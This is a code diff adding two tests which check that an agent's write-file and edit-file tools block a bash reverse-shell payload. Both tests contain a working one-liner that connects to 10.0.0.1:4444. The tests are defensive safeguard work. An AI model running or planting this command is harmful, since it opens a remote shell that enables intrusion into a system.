@@ -192,6 +192,19 @@ describe('writeFileTool', () => {
     expect(content).toBe('data');
   });
 
+  it('blocks writing a known-malicious payload (reverse shell)', async () => {
+    const d = await makeTempDir();
+    setTenantWorkspace(d);
+    const filePath = join(d, 'evil.sh');
+
+    await expect(
+      writeFileTool.handler(
+        { path: filePath, content: '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' },
+        makeAgent(),
+      ),
+    ).rejects.toThrow(/Blocked/i);
+  });
+
   it('creates parent directories recursively', async () => {
     const d = await makeTempDir();
     setTenantWorkspace(d);
@@ -291,6 +304,22 @@ describe('editFileTool', () => {
     );
     expect(res).toContain('1 replacement');
     expect(await readFile(p, 'utf-8')).toBe('# Title\n\nPrice: CHF 149\n\nEnd.');
+  });
+
+  it('blocks an edit that assembles a malicious payload', async () => {
+    const d = await makeTempDir();
+    setTenantWorkspace(d);
+    const p = join(d, 'script.sh');
+    writeFileSync(p, '#!/bin/bash\necho placeholder\n', 'utf-8');
+
+    await expect(
+      editFileTool.handler(
+        { path: p, old_string: 'echo placeholder', new_string: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
+        makeAgent(),
+      ),
+    ).rejects.toThrow(/Blocked/i);
+    // original content is left untouched
+    expect(await readFile(p, 'utf-8')).toBe('#!/bin/bash\necho placeholder\n');
   });
 
   it('errors when old_string is not found', async () => {
